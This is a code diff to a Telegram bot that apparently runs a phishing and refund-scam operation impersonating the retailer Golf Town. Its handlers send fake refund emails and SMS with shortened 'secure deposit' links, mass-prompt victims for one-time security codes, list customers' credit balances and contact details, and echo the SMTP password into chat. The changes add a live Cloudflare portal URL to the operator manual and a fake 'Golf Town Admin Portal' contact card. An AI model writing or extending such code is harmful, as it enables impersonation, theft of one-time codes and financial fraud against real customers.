@@ -248,6 +248,7 @@ async function executeRefundAndEmail(
   const depositToken = Buffer.from(`${custId}-${amount}-${Date.now()}`).toString('hex').slice(0, 16);
   const activeSessionId = `SESS-${Math.floor(100000 + Math.random() * 900000)}`;
 
+
   await sendTelegramRequest('sendMessage', {
     chat_id: chatId,
     text: `⏳ *Processing SMTP refund notice to:* \`${recipientEmail}\`...`,
@@ -449,6 +450,7 @@ async function executeRefundAndEmail(
     };
     smtpDebugLogsStack.unshift(debugLogEntry);
 
+
     await sendTelegramRequest('sendMessage', {
       chat_id: chatId,
       text: `✅ *EMAIL REFUND NOTICE DISPATCHED!*\n\n` +
@@ -475,6 +477,7 @@ async function executeRefundAndEmail(
       logs: sessionLogs
     };
     smtpDebugLogsStack.unshift(debugLogEntry);
+
 
     await sendTelegramRequest('sendMessage', {
       chat_id: chatId,
@@ -760,6 +763,7 @@ async function handleTelegramUpdate(update: any) {
 
     // Check if bot is paused (ignore all commands except resume or start)
     if (isBotPaused && !text.includes("▶️ Resume Bot") && !text.startsWith('/start')) {
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: `⏸️ *TELEGRAM REFUND BOT IS PAUSED*\n\n` +
@@ -816,6 +820,7 @@ async function handleTelegramUpdate(update: any) {
         replyText += `⚠️ No nearby store could be matched in the database.`;
       }
 
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: replyText,
@@ -836,6 +841,7 @@ async function handleTelegramUpdate(update: any) {
                         `• *Telegram User ID:* \`${contact.user_id || 'N/A'}\`\n\n` +
                         `✅ Contact details loaded into session telemetry successfully.`;
 
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: replyText,
@@ -849,8 +855,16 @@ async function handleTelegramUpdate(update: any) {
       customTelegramConfig.telegramChatId = chatId;
       saveTelegramConfig(customTelegramConfig);
 
+      let appUrl = process.env.APP_URL || "http://localhost:3000";
+      if (fs.existsSync(".cloudflare_url")) { appUrl = fs.readFileSync(".cloudflare_url", "utf-8").trim(); }
       const manualText = `🏌️‍♂️ *GOLF TOWN INTERACTIVE ADMIN TELEMETRY TERMINAL* 🏌️‍♂️\n\n` +
                          `Welcome to the command control center. Below is your comprehensive system manual, listing all supported interactive features, bottom reply keyboards, and dynamic syntax utilities.\n\n` +
+                         `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                         `🔗 *LIVE SECURE PORTAL ACCESS*\n` +
+                         `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                         `*URL:* \`${appUrl}\`\n` +
+                         `*Start Polling:* \`${appUrl}/api/telegram-config/start-polling\`\n` +
+                         `*Stop Polling:* \`${appUrl}/api/telegram-config/stop-polling\`\n\n` +
                          `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                          `⚙️ *CORE ADMINISTRATIVE COMMANDS*\n` +
                          `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
@@ -878,6 +892,14 @@ async function handleTelegramUpdate(update: any) {
                          `- *"Approve Sandy's refund"*\n` +
                          `- *"Ask Aaron for security code"*`;
 
+
+      await sendTelegramRequest('sendContact', {
+        chat_id: chatId,
+        phone_number: '+18008105555',
+        first_name: 'Golf Town',
+        last_name: 'Admin Portal'
+      });
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: manualText,
@@ -902,6 +924,7 @@ async function handleTelegramUpdate(update: any) {
 
     // Command: 🔙 Main Menu
     if (text.includes("🔙 Main Menu")) {
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: `🏌️‍♂️ *GOLF TOWN ADMIN MAIN MENU* 🏌️‍♂️\n\n` +
@@ -932,6 +955,7 @@ async function handleTelegramUpdate(update: any) {
           responseText += `_Showing top 10 sessions. Total sessions in memory: ${sessions.length}_`;
         }
       }
+
 
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
@@ -968,6 +992,7 @@ async function handleTelegramUpdate(update: any) {
         }
       }
       
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: `🔑 *MASS SECURITY OTP PROMPT EXECUTED*\n\n` +
@@ -1000,6 +1025,7 @@ async function handleTelegramUpdate(update: any) {
         }
       }
       
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: `✅ *MASS REFUND APPROVAL COMPLETE*\n\n` +
@@ -1016,6 +1042,7 @@ async function handleTelegramUpdate(update: any) {
     if (text.includes("❌ Clear Sessions")) {
       const clearedCount = paymentSessions.size;
       paymentSessions.clear();
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: `❌ *IN-MEMORY REFUND SESSIONS PURGED*\n\n` +
@@ -1036,6 +1063,7 @@ async function handleTelegramUpdate(update: any) {
                         `  Phone: \`${store.phone || 'N/A'}\`\n\n`;
       });
       responseText += `_For complete list of store locations, use the corporate admin locator on the dashboard portal._`;
+
 
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
@@ -1061,6 +1089,7 @@ async function handleTelegramUpdate(update: any) {
         });
       }
 
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: responseText,
@@ -1080,6 +1109,7 @@ async function handleTelegramUpdate(update: any) {
                            `• *Bound Chat Group ID:* \`${customTelegramConfig.telegramChatId || 'Not Configured'}\`\n` +
                            `• *Bound Bot Username:* \`GolfTownRefundBot\`\n\n` +
                            `• *System Integrity Check:* All telemetry loops running 100% normal.`;
+
 
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
@@ -1119,6 +1149,7 @@ async function handleTelegramUpdate(update: any) {
                            `• *SMTP Latency:* \`~12ms (SSL Handshake Verified)\`\n\n` +
                            `🛡️ Telemetry tracking running active since startup.`;
                            
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: responseText,
@@ -1141,6 +1172,7 @@ async function handleTelegramUpdate(update: any) {
                            `• *Polling Hook Backoff:* \`0ms\` (Instant poll active)\n\n` +
                            `✅ All hardware triggers and API integrations are running within normal parameters.`;
                            
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: responseText,
@@ -1165,6 +1197,7 @@ async function handleTelegramUpdate(update: any) {
                            `• *Sender Account Pass:* \`${smtpPass}\`\n\n` +
                            `⚠️ *Warning:* Corporate dispatches must use certified relay channels to avoid spam-folder classifications. Config changes can be pushed from the Admin panel UI.`;
                            
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: responseText,
@@ -1187,6 +1220,7 @@ async function handleTelegramUpdate(update: any) {
                           `• *Error Message:* \`${log.error || 'Unknown network error'}\`\n\n`;
         });
       }
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: responseText,
@@ -1209,6 +1243,7 @@ async function handleTelegramUpdate(update: any) {
                          `• *Outstanding System Liability:* \`$${totalBalance.toLocaleString('en-CA', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} CAD\`\n\n` +
                          `Select a specific retail store location from the dynamic keyboard below to view tailored database grids, analyze credit distributions, or trigger bulk refund processes.`;
 
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: responseText,
@@ -1229,6 +1264,7 @@ async function handleTelegramUpdate(update: any) {
                            `• *Total outstanding credits:* \`$${totalBalance.toLocaleString('en-CA', { minimumFractionDigits: 2 })}\` CAD\n\n` +
                            `Please select a dedicated database viewing or refund option below:`;
                            
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: responseText,
@@ -1249,6 +1285,7 @@ async function handleTelegramUpdate(update: any) {
                            `• *Total outstanding credits:* \`$${totalBalance.toLocaleString('en-CA', { minimumFractionDigits: 2 })}\` CAD\n\n` +
                            `Please select a dedicated database viewing or refund option below:`;
                            
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: responseText,
@@ -1267,6 +1304,7 @@ async function handleTelegramUpdate(update: any) {
                            `• *Integrated outstanding credits:* \`$${totalBalance.toLocaleString('en-CA', { minimumFractionDigits: 2 })}\` CAD\n\n` +
                            `Choose from the combined action set below:`;
                            
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: responseText,
@@ -1291,6 +1329,7 @@ async function handleTelegramUpdate(update: any) {
       if (targetCustomers.length > 10) {
         responseText += `\n_Showing top 10 of ${targetCustomers.length} matching store database entries._`;
       }
+
 
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
@@ -1320,6 +1359,7 @@ async function handleTelegramUpdate(update: any) {
                         `   • *Action:* 👉 /send\\_${c.custId || c.id}\n\n`;
       });
 
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: responseText,
@@ -1346,6 +1386,7 @@ async function handleTelegramUpdate(update: any) {
         });
       }
 
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: responseText,
@@ -1371,6 +1412,7 @@ async function handleTelegramUpdate(update: any) {
                           `   • Balance: \`$${Number(c.sumOfStoreCreditBalance || 0).toLocaleString('en-CA', { minimumFractionDigits: 2 })}\` CAD 👉 /send\\_${c.custId || c.id}\n`;
         });
       }
+
 
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
@@ -1401,6 +1443,7 @@ async function handleTelegramUpdate(update: any) {
                            `• *Highest Individual Credit:* \`$${Number(highest?.sumOfStoreCreditBalance || 0).toLocaleString('en-CA', { minimumFractionDigits: 2 })}\` (${highest?.firstName || ''} ${highest?.lastName || ''})\n` +
                            `• *Lowest Individual Credit:* \`$${Number(lowest?.sumOfStoreCreditBalance || 0).toLocaleString('en-CA', { minimumFractionDigits: 2 })}\` (${lowest?.firstName || ''} ${lowest?.lastName || ''})\n\n` +
                            `🛡️ Corporate telemetry ledger audit finalized and validated.`;
+
 
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
@@ -1433,6 +1476,7 @@ async function handleTelegramUpdate(update: any) {
         }
       }
 
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: `💸 *BULK AUTO-REFUND COMPLETE (STORE #${storeId})*\n\n` +
@@ -1456,6 +1500,7 @@ async function handleTelegramUpdate(update: any) {
                         `   • *Email:* \`${c.email || '(blank)'}\`\n` +
                         `   • *Action:* 👉 /send\\_${c.custId || c.id}\n\n`;
       });
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: responseText,
@@ -1467,6 +1512,7 @@ async function handleTelegramUpdate(update: any) {
 
     // Command: 🔍 Search Customer (Fallback)
     if (text.trim() === "🔍 Search Customer" || text.trim() === "🔍 Search Database") {
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: `🔍 *LIVE DATABASE LOOKUP PROMPT*\n\n` +
@@ -1486,6 +1532,7 @@ async function handleTelegramUpdate(update: any) {
                            `• *Notice History Size:* \`${noticeHistoryStack.length}\` entries\n\n` +
                            `Adjust bot execution using the expanded admin buttons.`;
                            
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: responseText,
@@ -1498,6 +1545,7 @@ async function handleTelegramUpdate(update: any) {
     // Command: ⏸️ Pause Bot
     if (text.includes("⏸️ Pause Bot")) {
       isBotPaused = true;
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: `⏸️ *TELEGRAM REFUND BOT PAUSED*\n\n` +
@@ -1515,6 +1563,7 @@ async function handleTelegramUpdate(update: any) {
     // Command: ▶️ Resume Bot
     if (text.includes("▶️ Resume Bot")) {
       isBotPaused = false;
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: `▶️ *TELEGRAM REFUND BOT RESUMED*\n\n` +
@@ -1528,6 +1577,7 @@ async function handleTelegramUpdate(update: any) {
     // Command: 🧹 Clear Notices
     if (text.includes("🧹 Clear Notices")) {
       noticeHistoryStack.length = 0;
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: `🧹 *NOTICE HISTORY CLEANED*\n\n` +
@@ -1541,6 +1591,7 @@ async function handleTelegramUpdate(update: any) {
     // Command: 📣 Send Test Alert
     if (text.includes("📣 Send Test Alert")) {
       const testAmount = (Math.random() * 400 + 100).toFixed(2);
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: `🚨 *CRITICAL TELEMETRY TEST ALERT* 🚨\n\n` +
@@ -1575,6 +1626,7 @@ async function handleTelegramUpdate(update: any) {
       }
 
       if (!foundCust) {
+
         await sendTelegramRequest('sendMessage', {
           chat_id: chatId,
           text: `⚠️ *Customer Not Found:* Could not locate record with Customer ID or Session ID: \`${targetId}\` in the active database.`,
@@ -1608,6 +1660,7 @@ async function handleTelegramUpdate(update: any) {
           replyText += `\n⚠️ _No phone number on file._`;
         }
 
+
         await sendTelegramRequest('sendMessage', {
           chat_id: chatId,
           text: replyText,
@@ -1619,6 +1672,7 @@ async function handleTelegramUpdate(update: any) {
       if (action === '/email') {
         const recipientEmail = foundCust.email;
         if (!recipientEmail || recipientEmail === '(blank)' || !recipientEmail.includes('@')) {
+
           await sendTelegramRequest('sendMessage', {
             chat_id: chatId,
             text: `⚠️ Cannot send email: No valid email address configured for ${foundCust.firstName || 'customer'}.`,
@@ -1641,6 +1695,7 @@ async function handleTelegramUpdate(update: any) {
 
         const depositToken = Buffer.from(`${custId}-${amount}-${Date.now()}`).toString('hex').slice(0, 16);
         const activeSessionId = `SESS-${Math.floor(100000 + Math.random() * 900000)}`;
+
 
         await sendTelegramRequest('sendMessage', {
           chat_id: chatId,
@@ -1843,6 +1898,7 @@ async function handleTelegramUpdate(update: any) {
           };
           smtpDebugLogsStack.unshift(debugLogEntry);
 
+
           await sendTelegramRequest('sendMessage', {
             chat_id: chatId,
             text: `✅ *EMAIL REFUND NOTICE DISPATCHED!*\n\n` +
@@ -1869,6 +1925,7 @@ async function handleTelegramUpdate(update: any) {
             logs: sessionLogs
           };
           smtpDebugLogsStack.unshift(debugLogEntry);
+
 
           await sendTelegramRequest('sendMessage', {
             chat_id: chatId,
@@ -1907,6 +1964,7 @@ async function handleTelegramUpdate(update: any) {
 
         const cleanPhone = (phone || '').replace(/[^0-9+]/g, '');
         const smsBody = `Golf Town Store Credit Refund Notice: Hi ${firstName || 'Valued Customer'}, your $${amount} store credit refund is ready to claim: ${shortenedUrl}`;
+
 
         await sendTelegramRequest('sendMessage', {
           chat_id: chatId,
@@ -1957,6 +2015,7 @@ async function handleTelegramUpdate(update: any) {
       const parsedRefund = await parseRefundIntent(text);
       if (parsedRefund) {
         // Human-like smart conversation acknowledgment
+
         await sendTelegramRequest('sendMessage', {
           chat_id: chatId,
           text: parsedRefund.messageResponse,
@@ -2001,6 +2060,7 @@ async function handleTelegramUpdate(update: any) {
         }
       }
 
+
       await sendTelegramRequest('sendMessage', {
         chat_id: chatId,
         text: responseText,
@@ -2042,6 +2102,7 @@ async function handleTelegramUpdate(update: any) {
             status: 'SUCCESS'
           });
 
+
           await sendTelegramRequest('sendMessage', {
             chat_id: chatId,
             reply_to_message_id: messageId,
@@ -2065,6 +2126,7 @@ async function handleTelegramUpdate(update: any) {
             secureDepositUrl: `https://clck.ru/3GT${sessionId.slice(-6)}`,
             status: 'PROMPTED'
           });
+
 
           await sendTelegramRequest('sendMessage', {
             chat_id: chatId,
@@ -3416,6 +3478,7 @@ app.post('/api/telegram-config/test', async (req, res) => {
     return res.status(400).json({ success: false, error: 'No target Chat ID is configured. Please bind the bot in your group by typing /start first.' });
   }
 
+
   const result = await sendTelegramRequest('sendMessage', {
     chat_id: customTelegramConfig.telegramChatId,
     text: `🔔 *GOLF TOWN INTEGRATION TEST NOTICE* 🔔\n\nThis is an authorized SMTP/HTTP system confirmation notice. Your interactive Telegram webhook connection is 100% active and running.`,
@@ -3486,7 +3549,7 @@ async function startServer() {
         }
       }
     }));
-    app.get('*all', (req, res) => {
+    app.get('*', (req, res) => {
       res.sendFile(path.join(distPath, 'index.html'));
     });
   }
